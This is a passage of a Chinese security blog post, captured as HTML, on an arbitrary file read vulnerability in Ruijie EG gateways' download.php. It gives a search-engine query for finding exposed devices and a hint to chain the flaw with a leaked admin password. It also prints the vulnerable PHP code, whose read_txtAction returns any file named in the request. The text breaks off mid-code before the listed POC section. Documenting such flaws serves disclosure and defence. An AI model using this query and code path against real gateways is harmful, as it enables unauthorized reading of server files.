@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>锐捷 EG易网关 download.php 任意文件读取漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="锐捷 EG易网关 download.php 任意文件读取漏洞" />
+<meta property="og:description" content="锐捷 EG易网关 download.php 任意文件读取漏洞 漏洞描述 锐捷EG易网关 download.php 存在后台任意文件读取漏洞，导致可以读取服务器任意文件 漏洞影响 1 锐捷EG易网关 网络测绘" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="锐捷 EG易网关 download.php 任意文件读取漏洞"/>
+<meta name="twitter:description" content="锐捷 EG易网关 download.php 任意文件读取漏洞 漏洞描述 锐捷EG易网关 download.php 存在后台任意文件读取漏洞，导致可以读取服务器任意文件 漏洞影响 1 锐捷EG易网关 网络测绘"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "锐捷 EG易网关 download.php 任意文件读取漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  1570 ,
+        "url": "http:\/\/example.org\/%E9%94%90%E6%8D%B7-eg%E6%98%93%E7%BD%91%E5%85%B3-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">锐捷 EG易网关 download.php 任意文件读取漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1570 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞影响">漏洞影响</a></li>
+    <li><a href="#网络测绘">网络测绘</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
+    <li><a href="#漏洞poc">漏洞POC</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="锐捷-eg易网关-downloadphp-任意文件读取漏洞">锐捷 EG易网关 download.php 任意文件读取漏洞</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>锐捷EG易网关 download.php 存在后台任意文件读取漏洞，导致可以读取服务器任意文件</p>
+<h2 id="漏洞影响">漏洞影响</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">锐捷EG易网关
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="网络测绘">网络测绘</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app=&#34;Ruijie-EG易网关&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞复现">漏洞复现</h2>
+<p>首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞)</p>
+<p>漏洞文件 download.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * 文件下载
+</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;IN&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>     <span class="c1">//定位该文件是入口文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DS&#39;</span><span class="p">,</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;AROOT&#39;</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="nx">DS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include_once</span><span class="p">(</span><span class="nx">AROOT</span> <span class="o">.</span> <span class="s1">&#39;mvc&#39;</span> <span class="o">.</span> <span class="nx">DS</span> <span class="o">.</span> <span class="s1">&#39;controller&#39;</span> <span class="o">.</span> <span class="nx">DS</span> <span class="o">.</span> <span class="s1">&#39;core.controller.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">defaultController</span> <span class="k">extends</span> <span class="nx">coreController</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * 应许下载的文件列表，不在该列表的文件一律不能下载，列表使用正则表达式
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * @var array
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$allow</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/^\/data\/.*$/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/^\/mnt\/sata0\/webmail\/.*$/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/^\/mnt\/sata0\/tech.+\.tar\.gz$$/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/^\/mnt\/sata0\/mail\/.*$/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/^\/mnt\/sata0\/audit_export\/.*$/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/^\/tmp\/sslvpn\/export\/.*$/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/^\/mnt\/sata0\/web\/nginx\/html\/sslvpn_pi\/.*$/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/^\/tmp\/.ca_web\/.*$/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/^\/mnt\/sata0\/sslvpn\/.*$/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/^\/tmp\/html\/utlog.*$/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$error</span><span class="p">;</span>     <span class="c1">//错误描述
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 载入默认的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">parent</span><span class="o">::</span><span class="na">__construct</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">     * 文件下载处理
+</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">indexAction</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filepath</span> <span class="o">=</span> <span class="nx">v</span><span class="p">(</span><span class="s2">&#34;file&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$fileinfo</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">iconv</span><span class="p">(</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span> <span class="s2">&#34;GB2312&#34;</span><span class="p">,</span> <span class="nv">$fileinfo</span><span class="p">[</span><span class="s2">&#34;filename&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$fileinfo</span><span class="p">[</span><span class="s2">&#34;extension&#34;</span><span class="p">])</span> <span class="o">?</span> <span class="s2">&#34;.&#34;</span> <span class="o">.</span> <span class="nv">$fileinfo</span><span class="p">[</span><span class="s2">&#34;extension&#34;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//只能读取下载GB2312文件不然会有乱码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$filepointer</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_checkfile</span><span class="p">(</span><span class="nx">iconv</span><span class="p">(</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span> <span class="s2">&#34;GB2312&#34;</span><span class="p">,</span><span class="nv">$filepath</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$filepointer</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">headers_sent</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span> <span class="o">=</span> <span class="s2">&#34;无法下载文件，已经输出其他请求头！&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Pragma: public&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Expires: 0&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Cache-Control: must-revalidate, post-check=0, pre-check=0&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Cache-Control: private&#34;</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Type: </span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_getMimeType</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Disposition: attachment; filename=</span><span class="se">\&#34;</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2">;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Transfer-Encoding: binary&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Length: </span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_getFileSize</span><span class="p">(</span><span class="nv">$filepointer</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">ob_clean</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="nx">rewind</span><span class="p">(</span><span class="nv">$filepointer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">fpassthru</span><span class="p">(</span><span class="nv">$filepointer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">)</span> <span class="p">{</span>   <span class="c1">//有错误产生
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">                    &lt;title&gt;文件下载失败&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">                    &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">                    &lt;script type=&#34;text/javascript&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">                        alert(&#34;&lt;?php echo $this-&gt;error; ?&gt;&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">                    &lt;/script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;/script&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;body&gt;&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    /**
+</span></span></span><span class="line"><span class="cl"><span class="err">     * 读取文本文件内容，支持ajax请求
+</span></span></span><span class="line"><span class="cl"><span class="err">     */
+</span></span></span><span class="line"><span class="cl"><span class="err">    public function read_txtAction() {
+</span></span></span><span class="line"><span class="cl"><span class="err">        $filename = v(&#34;file&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">        if (!file_exists($filename)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">            $data[&#34;status&#34;] = 2;
+</span></span></span><span class="line"><span class="cl"><span class="err">            $data[&#34;msg&#34;] = $filename . &#34;不存在&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            json_echo($data);
+</span></span></span><span class="line"><span class="cl"><span class="err">            exit();
+</span></span></span><span class="line"><span class="cl"><span class="err">        } else {
+</span></span></span><span class="line"><span class="cl"><span class="err">            $fileContent = file_get_contents($filename);
+</span></span></span><span class="line"><span class="cl"><span class="err">            $data = array(&#34;status&#34; =&gt; true, &#34;data&#34; =&gt; $fileContent);
+</span></span></span><span class="line"><span class="cl"><span class="err">            json_echo($data);
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    /**
+</span></span></span><span class="line"><span class="cl"><span class="err">     * 文件检查
+</span></span></span><span class="line"><span class="cl"><span class="err">     */
+</span></span></span><span class="line"><span class="cl"><span class="err">    private function _checkfile($filename) {
+</span></span></span><span class="line"><span class="cl"><span class="err">        if ($filename == false) {
+</span></span></span><span class="line"><span class="cl"><span class="err">            $this-&gt;error = &#34;请指定要下载的文件！&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            return FALSE;
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">        $isallow = false;
+</span></span></span><span class="line"><span class="cl"><span class="err">        foreach ($this-&gt;allow as $pattern) {
+</span></span></span><span class="line"><span class="cl"><span class="err">            if (preg_match($pattern, $filename)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">                $isallow = true;
+</span></span></span><span class="line"><span class="cl"><span class="err">                break;
+</span></span></span><span class="line"><span class="cl"><span class="err">            }
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">        if (!$isallow) {
+</span></span></span><span class="line"><span class="cl"><span class="err">            $this-&gt;error = &#34;该文件不允许下载！&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            return FALSE;
+</span></span></span><span class="line"><span class="cl"><span class="err">        }
+</span></span></span><span class="line"><span class="cl"><span class="err">        if (!is_file($filename)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">            $this-&gt;error = &#34;该文件不存在！&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">            return FALSE;
+</span></span></span><span class="line"><span class="cl"><span class="err">        } else if (!is_readable($filename)) {
+</span></span></span><span class="line"><span class="cl"><span class="err">            //if (system(&#34;chmod +r &#34; . escapeshellarg($filename))) {
+</span></span></span><span class="line"><span class="cl"><span class="err">                $this-&gt;error = &#34;无法下载该文件，没有权限！&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">                return FALSE;
+</span></span></span><span class="line"><span class="cl"><span class="err">            //}
